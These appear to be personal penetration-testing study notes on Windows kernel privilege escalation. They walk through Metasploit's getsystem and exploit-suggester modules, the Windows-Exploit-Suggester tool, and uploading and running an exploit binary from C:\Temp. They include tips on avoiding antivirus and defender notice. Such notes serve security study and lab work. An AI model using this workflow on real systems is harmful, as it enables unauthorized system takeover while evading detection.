

Related to [[Privilege Escalation]] and [[Post Exploitation]]

A kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system.

Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows.

Kernel Exploits tend to target vulns that allow to run arbitrary code on the system.

https://github.com/AonCyberLabs/Windows-Exploit-Suggester
https://github.com/SecWiki/windows-kernel-exploits/tree/master/M16-135

Using [[Metasploit]] we can use meterpreter commands like:

``` bash
getsystem
```

We can also use

``` bash
post/multi/recon/local_exploit_suggester
```

---

#### Using Windows-Exploit-Suggester

We can start getting the sysinfo from the machine

``` bash
sysinfo
```

Then copy the output to a file on the attacker machine

On the first run we should update:

``` bash
./windows-exploit-suggester.py --update
```

``` bash
./windows-exploit-suggester.py --database [.xls file] --systeminfo [sysinfo_file]
```

The exploits listed at the top are the ones with most chance of working.

Then we can search the exploits at the SecWiki repo listed in this file.

Click on the binary and download it, then we need to transfer it to the Windows target system.
Be cognizent of antivirus detection aswell.

We can use meterpreter to upload to temp

``` bash
cd C:\\
cd Temp\\
upload [pathtoexe]
shell
.\[exe]
```

You never one to use the home directory because THEY WILL SEE the exploit, when running the exe we may have to specify something, for example windows version

``` bash
.\[exe] [version]
```

